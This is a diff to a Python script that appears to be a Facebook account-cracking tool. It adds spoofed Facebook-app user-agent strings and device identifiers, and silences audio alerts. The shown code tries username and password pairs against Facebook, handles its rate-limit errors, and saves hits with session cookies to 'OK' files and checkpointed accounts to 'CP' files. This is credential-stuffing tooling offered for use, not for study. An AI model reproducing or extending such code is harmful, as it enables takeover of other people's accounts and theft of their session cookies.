@@ -57,9 +57,12 @@ for z in range(200):
 	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
 	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
 	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
-	ua = f"Dalvik/2.1.0 (Windows NT {versi_android}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/{str(rr(100,1000))}.0.0.{str(rr(1,50))}.{str(rr(10000,90000))};]"
-	if ua in ugent:pass
-	else:ugent.append(ua)
+	ua1 = f"Dalvik/2.1.0 (Windows NT {versi_android}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/{str(rr(100,1000))}.0.0.{str(rr(1,50))}.{str(rr(10000,90000))};]"
+	if ua1 in ugent:pass
+	else:ugent.append(ua1)
+	ua2 = f"Mozilla/5.0 (Linux; Android {versi_android}; Pixel 2 Build/OPM2.171026.006.G1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/{str(rr(100,1000))}.0.0.{str(rr(1,50))}.{str(rr(10000,90000))};]"
+	if ua2 in ugent:pass
+	else:ugent.append(ua2)
 	
 ###----------[ LOGO AUTHOR DAN VERSI]---------- ###
 class Logo:
@@ -518,7 +521,7 @@ class Crack:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
 							prints(tree)
-							os.popen('play-audio o.mp3')
+							#os.popen('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
 						break
 				elif "User must verify their account" in post.text:
@@ -530,7 +533,7 @@ class Crack:
 						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
 						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
 						prints(tree)
-						os.popen('play-audio c.mp3')
+						#os.popen('play-audio c.mp3')
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
@@ -737,14 +740,12 @@ class Session:
 		versi_android = random.randint(4,12)
 		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
 		versi_app = random.randint(111111111,999999999)
-		device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
+		device = random.choice(["SM-J320FN Build/LMY47V","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09","5.1.1; F1 Build/LMY47V"])
 		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
 		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(density)+";]"
 		return ugent
 if __name__=="__main__":
 	try:os.system('git pull')
-	except:pass
-	try:os.system('pkg install play-audio')
 	except:pass
 	try:os.mkdir("OK")
 	except:pass
